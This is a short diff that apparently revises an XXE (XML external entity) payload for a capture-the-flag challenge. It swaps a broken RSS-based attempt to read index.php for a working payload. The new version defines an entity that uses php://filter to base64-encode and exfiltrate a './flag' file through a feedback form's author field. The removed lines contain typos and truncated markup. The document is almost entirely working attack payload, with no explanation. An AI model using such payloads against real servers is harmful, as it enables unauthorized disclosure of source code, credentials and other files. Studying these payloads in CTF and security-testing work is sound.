@@ -1,11 +1,9 @@
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<rss version="2.0">
-<!DOCTYPE foo [
-<!ELEMENT foo ANY >
-<!ENTITY xxe SYSTEM "php://filter/read=covnert.base64-encode/resource=index.php" >]>
-<channel>
-    <title>&xxe;</tile>
-    <link>mypass</link>
-    <de
-</channel>
-</rss>
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE ANY [
+<!ENTITY remote SYSTEM "php://filter/read=convert.base64-encode/resource=./flag">
+]>
+<feedback>
+  <author>&remote;</author>
+  <email>2@ww.com</email>
+  <content>undefined</content>
+</feedback>
